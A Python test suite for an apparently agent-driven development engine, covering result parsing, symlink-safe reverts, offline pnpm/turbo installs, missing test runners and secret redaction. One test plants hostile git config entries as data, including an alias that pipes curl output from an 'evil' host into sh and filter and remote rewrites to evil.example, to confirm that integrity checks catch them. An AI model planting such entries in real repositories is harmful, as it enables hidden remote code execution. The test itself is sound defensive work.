"""0.102.15 — the review of 0.102.13 (review-0102-13) and the japanlifeinfo #227 stop on 0.102.14 (pnpm + turbo monorepo:
`ERR_PNPM_RECURSIVE_EXEC_FIRST_FAIL  Command "turbo" not found` → "테스트 요약 형식을 읽지 못함"), plus two real-run stops the
lead added (one-man-company #687's single-role drift on 0.102.14, word_app #1797's visual `unsure` loop-back cap).
The reviewer's repros (scratchpad `r13/t/test_r0102_13.py`) are the first tests of their classes, adapted to the lead's
decisions. No network, no paid call: pnpm runs offline through the engine's Corepack home from a LOCAL seeded store.

Lead decisions (k6-notes "0.102.15"):
1  (B1) out/result.json stands in for the status line only for a narrowed DONE_WITH_CONCERNS (#687) or a line after
   the one marker that starts with `done` (any case); everything else → the repair session (removes m1).
2  (M1) the revert never reads behind a symlinked PARENT component; such paths are recorded, git restores tracked ones;
   an unlink that no longer applies / fails is recorded, never raised.
3  (M2) missing_ignored: no read-failure wording — mentioned + absent from the temp tree + present (ignored) in the main
   checkout, tool outputs never.
4  minors: m2 no `vscode` substring; m4 env-style secrets, URL userinfo, Bearer redacted; m3 reporter names of a group
   from another function / a constant; m5 `Covers: AC #n` lines.
5  (#227 A) an engine-owned DEP_DIRS symlink is linked into the temp tree whatever git's ignore verdict; a dep dir whose
   parent is absent is skipped and recorded (no FileNotFoundError).
6  (#227 B) pnpm repos: `pnpm fetch` of the lockfile only (network step), `pnpm install --offline --frozen-lockfile
   --ignore-scripts --ignore-pnpmfile --store-dir <engine store>` in the temp tree (store read-only); no node_modules
   link; an offline install failure is `engine-env-deps-offline`.
7  (#227 C) a runner that is not installed → `engine-env-deps-missing` (execute and test); execute reads
   commands.test_summary.
8  (#227 D) ANSI + turbo prefixes stripped, every summary line summed, turbo's task summary an auxiliary red signal.
+  the single-role path re-takes a format-only baseline (#687 on 0.102.14); a visual row `unsure` is covered + graded.
"""

import json
import os
import shutil
import subprocess
import unittest

import _util  # noqa: F401
import test_k6_0102_13 as T13
import test_k6_0102_9 as T9
from _k1 import Clock, FakeSpawn, RecJournal, git, repo, stream_lines, tmpdir
from _k2 import comment, decision, fixture, role, suite

from guildcore import checks as CH
from guildcore.checks import pmcache as PMC
from guildcore.decisions import DecisionLog
from guildcore.roles import result as R
from guildcore.roles import runner as RR
from guildcore.roles import scope as SC
from workflows.dev import cases as CS
from workflows.dev import effective as EFF
from workflows.dev import escalation as ESC
from workflows.dev import handoff as HO
from workflows.dev import ports as PO
from workflows.dev import preflight as PF
from workflows.dev.stages import test as T

REAL = os.path.join(_util.FX, "real")
GATE = ("DONE", "DONE_WITH_CONCERNS", "BLOCKED", "FAIL")
MAC = os.path.exists(CH.SANDBOX_EXEC)


def _read(name):
    with open(os.path.join(REAL, name), encoding="utf-8") as fh:
        return fh.read()


RAW_227_012 = _read("japanlifeinfo-227-012-raw.txt")       # 012-check-developer/out/raw.txt (home dir renamed)
TURBO_227 = _read("japanlifeinfo-227-turbo-test.txt")      # `pnpm exec turbo run test` on #227's tree (measured)


def _w(path, text, mode=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)
    if mode is not None:
        os.chmod(path, mode)


def _env_runs(case):
    d = tmpdir(case)
    old = os.environ.get("GLD_ENGINE_RUNS")
    os.environ["GLD_ENGINE_RUNS"] = d
    case.addCleanup(lambda: os.environ.__setitem__("GLD_ENGINE_RUNS", old) if old is not None
                    else os.environ.pop("GLD_ENGINE_RUNS", None))
    return d


def _code_blocks(h, point, n=7):
    return [b for b in DecisionLog.load(h.gh.comments(n)).blocks if b.get("point") == point]


# ---- 1 (B1): an allow shape for the structured stand-in --------------------------------------------------------------

class B1AllowShape(unittest.TestCase):
    setUp = T13.B1BlockedNeverDone.setUp
    _run = T13.B1BlockedNeverDone._run

    def _alt(self, reply, obj=None, allowed=GATE, schema=None):
        pres = R.parse_pres(reply, allowed)
        return R.structured_pres(pres, obj or {"file": "out/security-review.md"}, allowed, reply,
                                 schema or R.RESULT_SCHEMAS["specialist"])

    def test_r0102_13_rejected_line_is_not_done(self):
        self.assertIsNone(self._alt("Review written.\n>>> RESULT <<<\nREJECTED: SQL injection in api/login"))

    def test_r0102_13_changes_requested_is_not_done(self):
        self.assertIsNone(self._alt("Review written.\n>>> RESULT <<<\nCHANGES_REQUESTED — token logged in plain text"))

    def test_r0102_13_no_marker_refusal_is_not_done(self):
        self.assertIsNone(self._alt("重大な脆弱性があるため承認できません。詳細は out/security-review.md。"))
        self.assertIsNone(self._alt("I cannot approve this change: the token is logged."))
        self.assertIsNone(self._alt("Review written.\n>>> RESULT <<<\n🚫 STOP: secrets in repo"))

    def test_r0102_13_687_with_failed_in_prose_still_one_session(self):
        narrow = ("DONE", "BLOCKED", "NEEDS_CONTEXT", "FAIL")
        reply = ("Wrote skeleton.md. The previous approach failed on macOS 12.\n>>> RESULT <<<\n"
                 "DONE_WITH_CONCERNS: effectively macOS-only")
        alt = self._alt(reply, {"skeleton": "out/skeleton.md"}, narrow, {"type": "object", "required": ["skeleton"]})
        self.assertEqual((alt.status, alt.text), ("DONE", "concerns — effectively macOS-only"))

    def test_a_done_word_line_is_done(self):
        # 0.102.16 (review-0102-15 B1): never for a gate reviewer (the specialist schema) — another role's schema here
        tl = {"type": "object", "required": ["skeleton"]}
        for ln in ("Done.", "done — review written", "**Done**: all set", "DONE, nothing found", "done"):
            alt = self._alt("Review written. Something failed once.\n>>> RESULT <<<\n" + ln, {"skeleton": "s.md"},
                            schema=tl)
            self.assertIsNotNone(alt, ln)
            self.assertEqual(alt.status, "DONE", ln)
            self.assertIsNone(self._alt("Review written.\n>>> RESULT <<<\n" + ln), ln)

    def test_everything_else_is_the_repair_session(self):
        for reply in (">>> RESULT <<<\nAll set", ">>> RESULT <<<\nLGTM", ">>> RESULT <<<\nDONE_WITH_CONCERNS",
                      ">>> RESULT <<<\ndone_with_concerns", ">>> RESULT <<<\ndoneness unclear",
                      ">>> RESULT <<<\nDone.\n>>> RESULT <<<\nDone.", "no marker, done"):
            self.assertIsNone(self._alt(reply), reply)
        # a json status that contradicts the `done` line → repair
        self.assertIsNone(self._alt(">>> RESULT <<<\ndone", {"file": "out/x.md", "status": "BLOCKED"}))
        # a narrowed FAIL / BLOCKED never
        p = R.parse_pres(">>> RESULT <<<\nFAIL: crash", ("DONE", "BLOCKED"))
        self.assertIsNone(R.structured_pres(p, {"file": "x"}, ("DONE", "BLOCKED"), ">>> RESULT <<<\nFAIL: crash",
                                            R.RESULT_SCHEMAS["specialist"]))
        # required fields still needed
        self.assertIsNone(self._alt(">>> RESULT <<<\ndone", {"file": ""}))

    def test_the_runner_takes_the_repair_session_for_a_rejection(self):
        res = self._run("Review written.\n>>> RESULT <<<\nREJECTED: SQL injection in api/login")
        self.assertEqual((res.status, len(self.spawn.calls)), ("BLOCKED", 2))

    def test_the_runner_takes_one_session_for_a_done_word(self):
        # 0.102.16 (review-0102-15 B1): a gate reviewer's `Done.` is its verdict line — the repair session decides
        res = self._run("Review written.\n>>> RESULT <<<\nDone.")
        self.assertEqual((res.status, len(self.spawn.calls)), ("BLOCKED", 2))
        # (another role's schema still takes one session — `test_a_done_word_line_is_done`)

    def test_no_whole_reply_scan_any_more(self):
        self.assertFalse(hasattr(R, "blocking_token"))


# ---- 2 (M1): never behind a symlinked parent ---------------------------------------------------------------------------

class M1BehindALink(unittest.TestCase):
    def _setup(self):
        base = tmpdir(self)
        wt, victim, keep = (os.path.join(base, x) for x in ("wt", "victim", "keep"))
        os.makedirs(os.path.join(wt, "pkg"))
        os.makedirs(victim)
        _w(os.path.join(victim, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_SECRET\n")
        git(wt, "init", "-q")
        git(wt, "config", "user.email", "a@b")
        git(wt, "config", "user.name", "a")
        _w(os.path.join(wt, "pkg", ".npmrc"), "registry=x\n")
        git(wt, "add", ".")
        git(wt, "commit", "-qm", "i")
        os.rename(os.path.join(wt, "pkg"), os.path.join(base, "moved"))
        os.symlink(victim, os.path.join(wt, "pkg"))
        return wt, keep, victim, SC.snapshot(wt)

    def _secrets(self, keep):
        found = []
        for r, _d, fs in os.walk(keep):
            for f in fs:
                with open(os.path.join(r, f), errors="replace") as fh:
                    if "npm_SECRET" in fh.read():
                        found.append(os.path.relpath(os.path.join(r, f), keep))
        return found

    def test_r0102_13_target_never_copied(self):
        wt, keep, victim, after = self._setup()
        SC.revert_writes(wt, ["pkg", "pkg/.npmrc"], keep_dir=keep, after=after)
        self.assertEqual(self._secrets(keep), [])
        self.assertEqual(open(os.path.join(victim, ".npmrc")).read(), "//registry.npmjs.org/:_authToken=npm_SECRET\n")
        self.assertFalse(os.path.islink(os.path.join(wt, "pkg")))
        self.assertEqual(open(os.path.join(wt, "pkg", ".npmrc")).read(), "registry=x\n")
        self.assertEqual(git(wt, "status", "--porcelain"), "")
        man = json.load(open(os.path.join(keep, "manifest.json")))
        row = [x for x in man if x["path"] == "pkg/.npmrc"][0]
        self.assertEqual((row["kind"], row["link_at"], row["copy"]), ("behind-link", "pkg", None))

    def test_r0102_13_reverse_order_does_not_raise(self):
        wt, keep, victim, after = self._setup()
        out = SC.revert_writes(wt, ["pkg/.npmrc", "pkg"], keep_dir=keep, after=after)
        self.assertEqual(self._secrets(keep), [])
        self.assertEqual(open(os.path.join(wt, "pkg", ".npmrc")).read(), "registry=x\n")
        self.assertTrue(os.path.exists(os.path.join(victim, ".npmrc")))
        self.assertEqual(git(wt, "status", "--porcelain"), "")
        self.assertEqual(sorted(p for p, _t in out), ["pkg", "pkg/.npmrc"])
        man = json.load(open(os.path.join(keep, "manifest.json")))
        self.assertIn("skipped: now dir", [x for x in man if x["path"] == "pkg"][0].get("unlink", ""))

    def test_behind_link(self):
        wt, _k, _v, _a = self._setup()
        self.assertEqual(SC.behind_link(wt, "pkg/.npmrc"), "pkg")
        self.assertIsNone(SC.behind_link(wt, "pkg"))
        self.assertIsNone(SC.behind_link(wt, "nope/x"))

    def test_an_untracked_path_behind_a_link_is_left_and_recorded(self):
        wt, keep, victim, _a = self._setup()
        _w(os.path.join(victim, "new.txt"), "victim file\n")
        after = SC.snapshot(wt)
        SC.revert_writes(wt, ["pkg/new.txt"], keep_dir=keep, after=after)
        self.assertTrue(os.path.exists(os.path.join(victim, "new.txt")))         # never unlinked through the link
        row = json.load(open(os.path.join(keep, "manifest.json")))[0]
        self.assertEqual(row["kind"], "behind-link")


# ---- 3 (M2): missing_ignored without the read-failure word list --------------------------------------------------------

class M2MissingIgnored(unittest.TestCase):
    def setUp(self):
        self.root = repo(self, {"a.txt": "a\n"})
        self.tree = tmpdir(self)
        self.files = ["src/config.local.js", "src/generated/api.json", ".env"]
        _w(os.path.join(self.root, ".gitignore"), "\n".join(self.files) + "\n")
        for f in self.files:
            _w(os.path.join(self.root, f), "")

    def _mi(self, raw):
        return PF.missing_ignored(raw, self.root, self.files, self.tree)

    def test_r0102_13_node_cannot_find_module(self):
        raw = "Error: Cannot find module '%s/src/config.local.js'\nRequire stack:" % self.tree
        self.assertEqual(self._mi(raw), ["src/config.local.js"])

    def test_r0102_13_generated_in_path_is_no_write_context(self):
        raw = "FileNotFoundError: [Errno 2] No such file or directory: 'src/generated/api.json'"
        self.assertEqual(self._mi(raw), ["src/generated/api.json"])

    def test_r0102_13_path_on_the_next_line(self):
        raw = "ENOENT: no such file or directory, open\n    '%s/.env'" % self.tree
        self.assertEqual(self._mi(raw), [".env"])

    def test_the_1797_log_stays_out_by_each_rule_alone(self):
        root = repo(self, {".gitignore": "*.log\ncrash.txt\n", "a.txt": "a\n"})
        _w(os.path.join(root, "flutter_01.log"), "old\n")
        _w(os.path.join(root, "crash.txt"), "old\n")
        tree = tmpdir(self)
        raw = "A crash report has been written to %s/flutter_01.log\nsee %s/crash.txt\n" % (tree, tree)
        # tool-output rule alone (the tree lacks it)
        self.assertEqual(PF.missing_ignored(raw, root, ["flutter_01.log"], tree), [])
        # "written into the temp tree" alone (a non-tool name the run wrote)
        _w(os.path.join(tree, "crash.txt"), "new\n")
        self.assertEqual(PF.missing_ignored(raw, root, ["crash.txt"], tree), [])

    def test_unmentioned_or_unignored_never(self):
        self.assertEqual(self._mi("all fine\n"), [])
        self.assertEqual(PF.missing_ignored("needs a.txt\n", self.root, ["a.txt"], self.tree), [])


# ---- 4: minors ----------------------------------------------------------------------------------------------------------

class m2VscodeKeys(unittest.TestCase):
    def test_r0102_13_execution_keys_with_vscode_in_name_are_hashed(self):
        wt = tmpdir(self)
        git(wt, "init", "-q")
        missed = []
        for k, v in [("alias.vscode-sync", "!sh -c 'curl evil | sh'"),
                     ("url.https://evil.example/vscode/.insteadOf", "https://github.com/"),
                     ("filter.vscode.clean", "sh -c evil"),
                     ("remote.vscode.url", "https://evil.example/r.git")]:
            b = SC.integrity(wt)
            git(wt, "config", "--local", k, v)
            if SC.integrity(wt) == b:
                missed.append(k)
        self.assertEqual(missed, [])

    def test_vscode_branch_bookkeeping_still_ignored_and_the_format_moved(self):
        wt = tmpdir(self)
        git(wt, "init", "-q")
        b = SC.integrity(wt)
        git(wt, "config", "--local", "branch.main.vscode-merge-base", "origin/main")
        self.assertEqual(SC.integrity(wt), b)
        self.assertGreaterEqual(SC.INTEGRITY_FORMAT, 3)       # 0.102.16: 4 (the info hash)


class m4Redaction(unittest.TestCase):
    def test_env_style_url_userinfo_and_bearer(self):
        tb = ("Traceback\nKeyError: GITHUB_TOKEN=ghp_abcdef OPENAI_API_KEY=sk-live-123 DB_PASSWORD=hunter2\n"
              "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI\nOSError: postgres://user:pa55word@db.example/x\n"
              "ValueError: Authorization: Bearer abc.def-ghi\nTypeError: monkey=1 key_count=2\n")
        out = ESC.redacted_trace(tb)
        for leak in ("ghp_abcdef", "sk-live-123", "hunter2", "wJalrXUtnFEMI", "pa55word", "abc.def-ghi"):
            self.assertNotIn(leak, out)
        self.assertIn("GITHUB_TOKEN=", out)
        self.assertIn("postgres://user:", out)
        self.assertIn("monkey=1 key_count=2", out)


class m3ReporterNames(unittest.TestCase):
    def test_r0102_13_group_from_a_helper_function(self):
        src = ("void main() {\n  group('SettingsScreen', () {\n    _perm();\n  });\n}\n"
               "void _perm() {\n  group('permission', () {\n    testWidgets('shows the badge', (t) async {});\n  });\n}\n")
        self.assertTrue(T.name_in_source(src, "SettingsScreen permission shows the badge", "flutter"))

    def test_r0102_13_group_named_by_a_constant(self):
        src = ("const kScreen = 'SettingsScreen';\nvoid main() {\n  group(kScreen, () {\n"
               "    testWidgets('shows the badge', (t) async {});\n  });\n}\n")
        self.assertTrue(T.name_in_source(src, "SettingsScreen shows the badge", "flutter"))

    def test_no_free_composition(self):
        src = ("const kScreen = 'SettingsScreen';\nvoid main() {\n  group(kScreen, () {\n"
               "    testWidgets('shows the badge', (t) async {});\n    testWidgets('shows the badge', (t) async {});\n"
               "  });\n  final note = 'random words';\n  print('Other');\n}\n")
        # a duplicate test literal is no unique anchor; an arbitrary literal is no group name
        self.assertFalse(T.name_in_source(src, "SettingsScreen shows the badge", "flutter"))
        src2 = src.replace("    testWidgets('shows the badge', (t) async {});\n  });", "  });", 1)
        self.assertTrue(T.name_in_source(src2, "SettingsScreen shows the badge", "flutter"))
        self.assertFalse(T.name_in_source(src2, "Other shows the badge", "flutter"))
        self.assertFalse(T.name_in_source(src2, "SettingsScreen shows the", "flutter"))


class m5CoversLine(unittest.TestCase):
    DOC = ("# Test cases\n\n### C1 Shows the badge\nCovers: AC #1\n- steps\n\n### C2 Hides it\n"
           "**Covers**: AC #2, #3\n- steps\n")

    def test_covers_lines_name_the_heading_case_acs(self):
        self.assertEqual(HO.cases_bad(self.DOC, [1, 2, 3], False), [])
        self.assertEqual(CS.ac_map(self.DOC), {"C1": ["AC #1"], "C2": ["AC #2", "AC #3"]})

    def test_prose_still_fills_nothing(self):
        doc = "# Test cases\n\n### C1 Shows\nThis also helps AC #2.\n"
        self.assertTrue(HO.cases_bad(doc, [1, 2], False))


# ---- 5 (#227 A): the engine's node_modules link reaches the temp tree -------------------------------------------------

class A227EngineLink(unittest.TestCase):
    def test_a_trailing_slash_gitignore_link_is_linked(self):
        runs = _env_runs(self)
        root = repo(self, {".gitignore": "node_modules/\n", "package.json": '{"name":"x"}\n', "a.js": "1\n"})
        nd = os.path.join(runs, "repo", "node", "abc", "node_modules")
        _w(os.path.join(nd, ".bin", "turbo"), "#!/bin/sh\n", 0o755)
        os.symlink(nd, os.path.join(root, "node_modules"))
        self.assertIn("?? node_modules", git(root, "status", "--porcelain"))   # untracked, NOT ignored
        with EFF.TempTree(root, "HEAD", [], overlay=True) as tt:
            link = os.path.join(tt.path, "node_modules")
            self.assertTrue(os.path.islink(link))
            self.assertEqual(os.path.realpath(link), os.path.realpath(nd))
            self.assertIn(os.path.realpath(nd), EFF.linked_dirs(tt.path))
            self.assertTrue(os.path.exists(os.path.join(link, ".bin", "turbo")))

    def test_a_link_outside_the_engine_cache_is_not(self):
        _env_runs(self)
        root = repo(self, {".gitignore": "node_modules/\n", "a.js": "1\n"})
        other = os.path.join(tmpdir(self), "node_modules")
        os.makedirs(other)
        os.symlink(other, os.path.join(root, "node_modules"))
        with EFF.TempTree(root, "HEAD", [], overlay=True) as tt:
            self.assertFalse(os.path.lexists(os.path.join(tt.path, "node_modules")))

    def test_a_dep_dir_whose_parent_is_absent_is_skipped_not_raised(self):
        _env_runs(self)
        root = repo(self, {".gitignore": "node_modules\n", "a.js": "1\n"})
        os.makedirs(os.path.join(root, "pkgs", "x", "node_modules", "y"))      # pkgs/x has no tracked file
        with EFF.TempTree(root, "HEAD", [], overlay=False) as tt:
            self.assertIn("pkgs/x/node_modules", tt.dep_skipped)
            self.assertFalse(os.path.exists(os.path.join(tt.path, "pkgs")))

    def test_a_pnpm_tree_links_no_node_modules(self):
        runs = _env_runs(self)
        root = repo(self, {".gitignore": "node_modules/\n", "package.json": '{"packageManager":"pnpm@8.15.0"}\n'})
        nd = os.path.join(runs, "node", "abc", "node_modules")
        os.makedirs(nd)
        os.symlink(nd, os.path.join(root, "node_modules"))
        os.makedirs(os.path.join(root, "apps", "x", "node_modules"))
        _w(os.path.join(root, "apps", "x", "index.js"), "1\n")
        git(root, "add", "apps/x/index.js")
        git(root, "commit", "-qm", "x")
        with EFF.TempTree(root, "HEAD", [], overlay=True) as tt:
            self.assertFalse(os.path.lexists(os.path.join(tt.path, "node_modules")))
            self.assertFalse(os.path.lexists(os.path.join(tt.path, "apps", "x", "node_modules")))
            self.assertIn("apps/x/node_modules", tt.dep_skipped)


# ---- 6 (#227 B): pnpm the pnpm way ------------------------------------------------------------------------------------

def _pnpm_ok():
    return MAC and PMC.present(PMC.home(), "pnpm", "8.15.0") and shutil.which("pnpm") is not None


PKG_ROOT = json.dumps({"name": "root", "private": True, "packageManager": "pnpm@8.15.0",
                       "scripts": {"preinstall": "touch PREINSTALL_RAN", "test": "pnpm -r test"}})
PKG_A = json.dumps({"name": "a", "version": "1.0.0", "dependencies": {"dep": "file:../../vendor/dep-1.0.0.tgz"},
                    "scripts": {"test": "node -e \"console.log('a sees', require('dep'))\""}})
PKG_B = json.dumps({"name": "b", "version": "1.0.0", "dependencies": {"a": "workspace:*"},
                    "scripts": {"test": "node -e \"require('a/package.json');console.log('b ok')\""}})
PNPMFILE = ('module.exports={hooks:{readPackage(p){require("fs").writeFileSync(__dirname+"/PNPMFILE_RAN","x");'
            'return p}}}\n')


def _pnpm_env(extra=None):
    e = {"PATH": os.environ["PATH"], "HOME": os.environ.get("HOME", "/"), "COREPACK_HOME": PMC.home(),
         "COREPACK_ENABLE_NETWORK": "0", "COREPACK_ENABLE_DOWNLOAD_PROMPT": "0"}
    e.update(extra or {})
    return e


@unittest.skipUnless(_pnpm_ok(), "needs macOS sandbox-exec and pnpm@8.15.0 in the engine's Corepack home")
class B227Pnpm(unittest.TestCase):
    """A pnpm workspace with a local tarball dependency; the engine store seeded locally (offline), then read-only."""

    def _workspace(self):
        root = repo(self, {".gitignore": "node_modules/\n", "package.json": PKG_ROOT,
                           "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n",
                           "packages/a/package.json": PKG_A, "packages/b/package.json": PKG_B,
                           "vendor/package/package.json": '{"name":"dep","version":"1.0.0","main":"index.js"}',
                           "vendor/package/index.js": "module.exports = 42\n", ".pnpmfile.cjs": PNPMFILE})
        subprocess.run(["tar", "czf", "dep-1.0.0.tgz", "package"], cwd=os.path.join(root, "vendor"), check=True)
        p = subprocess.run("pnpm install --lockfile-only --offline --ignore-pnpmfile --store-dir %s" %
                           os.path.join(tmpdir(self), "lockstore"), shell=True, cwd=root, env=_pnpm_env(),
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        self.assertEqual(p.returncode, 0, p.stdout.decode())
        git(root, "add", "-A")
        git(root, "commit", "-qm", "lock")
        return root

    def _store(self, root):
        """The ENGINE store, seeded from a scratch copy (offline: the dependency is a local tarball), then read-only."""
        store = os.path.join(tmpdir(self), "pnpm-store")
        seed = os.path.join(tmpdir(self), "seed")
        shutil.copytree(root, seed, ignore=shutil.ignore_patterns(".git"))
        p = subprocess.run(PO.PNPM_OFFLINE % store, shell=True, cwd=seed, env=_pnpm_env(),
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        self.assertEqual(p.returncode, 0, p.stdout.decode())
        subprocess.run(["chmod", "-R", "a-w", store], check=True)
        self.addCleanup(subprocess.run, ["chmod", "-R", "u+w", store])
        old = os.environ.get("GLD_ENGINE_PNPM_STORE")
        os.environ["GLD_ENGINE_PNPM_STORE"] = store
        self.addCleanup(lambda: os.environ.__setitem__("GLD_ENGINE_PNPM_STORE", old) if old is not None
                        else os.environ.pop("GLD_ENGINE_PNPM_STORE", None))
        return store

    def _suite(self, root, cmd="test ! -e PNPMFILE_RAN && test ! -e PREINSTALL_RAN && pnpm -r test"):
        rd = tmpdir(self)
        for d in ("in", "out", "tmp"):
            os.makedirs(os.path.join(rd, d))
        return PO.suite_in_tree(root, None, [cmd], "developer", 300, rd, PO.check_env(_pnpm_env(), root, rd),
                                warm=False)

    def test_the_suite_installs_offline_from_the_engine_store(self):
        root = self._workspace()
        store = self._store(root)
        r = self._suite(root)
        self.assertTrue(r.passed, r.raw[-1500:])
        self.assertIn("a sees 42", r.raw)
        self.assertIn("b ok", r.raw)
        self.assertIsNone(r.deps_offline)
        self.assertEqual(r.deps_cmd, PO.PNPM_OFFLINE % store)
        self.assertFalse(os.path.lexists(os.path.join(root, "node_modules")))     # the worktree is not touched

    def test_lockfile_drift_is_deps_offline_not_a_red_suite(self):
        root = self._workspace()
        self._store(root)
        _w(os.path.join(root, "packages", "b", "package.json"),
           json.dumps(dict(json.loads(PKG_B), dependencies={"a": "workspace:*", "left-pad": "1.3.0"})))
        r = self._suite(root)
        self.assertFalse(r.passed)
        self.assertIn("ERR_PNPM_OUTDATED_LOCKFILE", r.deps_offline)
        line = PMC.deps_offline_line("test suite", r.deps_offline, PMC.pnpm_store())
        self.assertTrue(line.startswith("engine-env-deps-offline: test suite"), line)

    def test_a_package_not_in_the_store_is_deps_offline(self):
        root = self._workspace()
        empty = os.path.join(tmpdir(self), "empty-store")
        os.makedirs(empty)
        os.environ["GLD_ENGINE_PNPM_STORE"] = empty
        self.addCleanup(os.environ.pop, "GLD_ENGINE_PNPM_STORE", None)
        os.remove(os.path.join(root, "vendor", "dep-1.0.0.tgz"))                  # no local source either
        git(root, "commit", "-qam", "drop tarball")
        r = self._suite(root)
        self.assertFalse(r.passed)
        self.assertTrue(r.deps_offline)

    def test_the_fetch_copies_only_the_lockfile_and_runs_no_repo_code(self):
        root = self._workspace()
        store = os.path.join(tmpdir(self), "fetch-store")
        os.environ["GLD_ENGINE_PNPM_STORE"] = store
        self.addCleanup(os.environ.pop, "GLD_ENGINE_PNPM_STORE", None)
        rd = tmpdir(self)
        for d in ("in", "out", "tmp"):
            os.makedirs(os.path.join(rd, d))
        r, _px = PO.pnpm_fetch(root, rd, PO.check_env(_pnpm_env(), root, rd))
        self.assertTrue(os.path.isdir(store))
        for marker in ("PNPMFILE_RAN", "PREINSTALL_RAN"):
            self.assertFalse(os.path.exists(os.path.join(root, marker)))
        self.assertFalse(os.path.lexists(os.path.join(root, "node_modules")))
        self.assertEqual(os.listdir(os.path.join(rd, "tmp")).count("pnpm-fetch"), 0)   # its dir is removed
        self.assertIn("pnpm fetch --ignore-scripts --ignore-pnpmfile --store-dir", " ".join(s["cmd"] for s in r.steps))

    def test_deps_main_fetches_and_links_no_npm_install(self):
        root = self._workspace()
        store = os.path.join(tmpdir(self), "fetch-store")
        os.environ["GLD_ENGINE_PNPM_STORE"] = store
        self.addCleanup(os.environ.pop, "GLD_ENGINE_PNPM_STORE", None)
        _env_runs(self)
        rd = tmpdir(self)
        for d in ("in", "out", "tmp"):
            os.makedirs(os.path.join(rd, d))
        r = PO.deps_main(root, rd, PO.check_env(_pnpm_env(), root, rd), tools=None)
        self.assertIsNone(r.suite_node)
        self.assertFalse(os.path.lexists(os.path.join(root, "node_modules")))
        self.assertTrue(any(n.startswith("pnpm: fetch into %s" % store) for n in r.notes), r.notes)


class B227Detect(unittest.TestCase):
    def test_is_pnpm(self):
        d = tmpdir(self)
        _w(os.path.join(d, "package.json"), '{"packageManager": "pnpm@8.15.0+sha512.x"}')
        self.assertTrue(PMC.is_pnpm(d))
        _w(os.path.join(d, "package.json"), '{"packageManager": "yarn@4.1.0"}')
        _w(os.path.join(d, "pnpm-lock.yaml"), "lockfileVersion: '6.0'\n")
        self.assertFalse(PMC.is_pnpm(d))
        _w(os.path.join(d, "package.json"), '{"name": "x"}')
        self.assertTrue(PMC.is_pnpm(d))
        os.remove(os.path.join(d, "pnpm-lock.yaml"))
        self.assertFalse(PMC.is_pnpm(d))

    def test_the_store_is_engine_owned_and_explicit(self):
        self.assertEqual(PMC.pnpm_store({"HOME": "/h"}), "/h/.cache/guild-engine/pnpm-store")
        self.assertEqual(PMC.pnpm_store({"GLD_ENGINE_RUNS": "/r"}), "/r/pnpm-store")
        for c in (PO.PNPM_FETCH, PO.PNPM_OFFLINE):
            self.assertIn("--store-dir", c)
            self.assertIn("--ignore-scripts", c)
        self.assertIn("--ignore-pnpmfile", PO.PNPM_OFFLINE)
        self.assertIn("--frozen-lockfile", PO.PNPM_OFFLINE)
        self.assertIn("--offline", PO.PNPM_OFFLINE)

    def test_the_offline_install_keeps_the_store_read_only(self):
        d = tmpdir(self)
        _w(os.path.join(d, "pnpm-lock.yaml"), "x\n")
        seen = {}

        def fake(cmds, timeout_s, cwd=None, env=None, journal=None, who=None, sandbox=None, tmp=None):
            seen["sb"], seen["cmds"] = sandbox, cmds
            return CH.CheckResult(True, 0, False, "", [], 1)
        old = CH.run_command
        CH.run_command = fake
        try:
            os.environ["GLD_ENGINE_PNPM_STORE"] = "/s/store"
            self.addCleanup(os.environ.pop, "GLD_ENGINE_PNPM_STORE", None)
            r = PO.pnpm_offline_install(d, d, {}, {"filesystem": {"denyWrite": ["/x"]}})
        finally:
            CH.run_command = old
        self.assertIn("/s/store/**", seen["sb"]["filesystem"]["denyWrite"])
        self.assertEqual(r.deps_cmd, PO.PNPM_OFFLINE % "/s/store")
        os.makedirs(os.path.join(d, "node_modules"))                    # an effective re-run of the same tree
        self.assertIsNone(PO.pnpm_offline_install(d, d, {}, {"filesystem": {}}))

    def test_turbo_runs_in_loose_env_mode(self):
        e = CH.check_env({"PATH": "/bin"}, tmpdir(self))
        self.assertEqual((e["TURBO_ENV_MODE"], e["TURBO_TELEMETRY_DISABLED"]), ("loose", "1"))


class B227Stages(unittest.TestCase):
    def _r(self):
        r = suite("ERR_PNPM_OUTDATED_LOCKFILE  Cannot install with \"frozen-lockfile\"\n", passed=False, rc=1)
        r.deps_offline = "ERR_PNPM_OUTDATED_LOCKFILE Cannot install with \"frozen-lockfile\""
        return r

    def test_execute(self):
        from _k3 import XHarness, dev
        from workflows.dev.stages import execute as X
        h = XHarness(self, roles=[dev()], suites=[self._r()])
        r = X.run(h.p, "implement")
        self.assertEqual(r.kind, "PAUSE")
        nh = h.body_with("needs-human")
        self.assertIn("env: other — engine-env-deps-offline: execute suite", nh)
        self.assertNotIn("테스트 요약 형식을 읽지 못함", nh)

    def test_test_stage(self):
        h = T9.Harness(self, fixture(), suites=[self._r()])
        self.assertEqual(T.run(h.p).token(), "OK PAUSE: needs-human — engine-env-deps-offline")


# ---- 7 (#227 C): a runner that is not installed ------------------------------------------------------------------------

class C227RunnerMissing(unittest.TestCase):
    def test_the_real_012_output(self):
        self.assertEqual(PMC.runner_missing(RAW_227_012), 'ERR_PNPM_RECURSIVE_EXEC_FIRST_FAIL Command "turbo" not found')
        self.assertIsNone(PMC.offline_fetch_failure(RAW_227_012))
        self.assertIsNone(CH.parse_summary(RAW_227_012))

    def test_the_shapes(self):
        for raw in ("sh: vitest: command not found", "/bin/sh: line 1: jest: command not found",
                    "npm ERR! could not determine executable to run", "error Command \"jest\" not found.",
                    "sh: 1: vitest: not found"):
            self.assertIsNotNone(PMC.runner_missing("x\n%s\ny\n" % raw), raw)
        for raw in ("Tests: 1 failed", "Error: element not found", "Command failed: git"):
            self.assertIsNone(PMC.runner_missing(raw), raw)

    def test_execute_pauses_deps_missing(self):
        from _k3 import XHarness, dev
        from workflows.dev.stages import execute as X
        h = XHarness(self, roles=[dev()], suites=[suite(RAW_227_012, passed=False, rc=1)])
        r = X.run(h.p, "implement")
        self.assertEqual(r.kind, "PAUSE")
        nh = h.body_with("needs-human")
        self.assertIn("env: other — engine-env-deps-missing: execute suite", nh)
        self.assertIn('Command "turbo" not found', nh)
        self.assertNotIn("테스트 요약 형식을 읽지 못함", nh)

